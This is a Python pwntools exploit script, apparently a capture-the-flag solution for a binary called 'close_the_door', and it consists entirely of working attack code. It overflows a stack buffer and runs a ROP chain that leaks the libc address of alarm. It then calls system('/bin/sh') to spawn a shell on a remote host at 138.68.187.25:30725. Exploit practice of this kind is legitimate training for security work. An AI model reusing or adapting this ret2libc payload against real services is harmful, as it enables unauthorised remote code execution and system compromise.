#!/usr/bin/env python3

from pwn import *

# ======================================= #
RIP_OFF: int    = 0x48
STR_OFF: int    = 0x28
POP_RDI: int    = 0x0000000000400b53
POP_RSI: int    = 0x0000000000400b51
# ======================================= #

def prompt(r: tubes.tube.tube) -> None:
    r.recvuntil(b'> ')

def do_overflow(p: ELF, r: tubes.tube.tube, chain: bytes, lens: int = 0xf) -> None:
    r.sendline(p32(lens)*(STR_OFF//4) + p64(p.sym['companion']) + p32(lens)*((RIP_OFF-8-STR_OFF)//4) + chain)

def main():
    context.clear(arch='amd64')

    p = ELF('./close_the_door')
    # l = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
    # r = process(p.path)
    # gdb.attach(r, 'b *hidden_func+244')
    # gdb.attach(r, 'b *hidden_func+182')
    # gdb.attach(r, 'b *hidden_func')
    r = remote('138.68.187.25', 30725)
    l = ELF('./libc.so.6')

    prompt(r)
    r.sendline(b'/bin/sh\x00')
    prompt(r)
    r.sendline(b'42')

    leakr: ROP = ROP(p)
    leakr.call('write', [0x1, p.sym['got.alarm'],])
    leakr.call('read', [0x0, p.sym['check'],])
    leakr.call(POP_RDI)
    leakr.raw(0x1)
    leakr.call('hidden_func')

    prompt(r)
    print(f'[*] Sending payload: ')
    print(leakr.dump())
    do_overflow(p, r, leakr.chain())

    alarm: int = u64(r.recvn(0xf+8)[0xf:])
    print(f'[*] Leaked got.alarm @ 0x{alarm:x} ... ')
    l.address = alarm - l.sym['alarm']
    print(f'[*] Got libc base = 0x{l.address:x} ... ')
    r.sendline(b'\x00'*8)

    drop: ROP = ROP(p)
    drop.call(POP_RDI)
    drop.raw(p.sym['companion'])
    drop.call(l.sym['system'])

    prompt(r)
    print(f'[*] Sending payload: ')
    print(drop.dump())
    do_overflow(p, r, drop.chain())

    r.interactive()

if __name__ == '__main__':
    main()
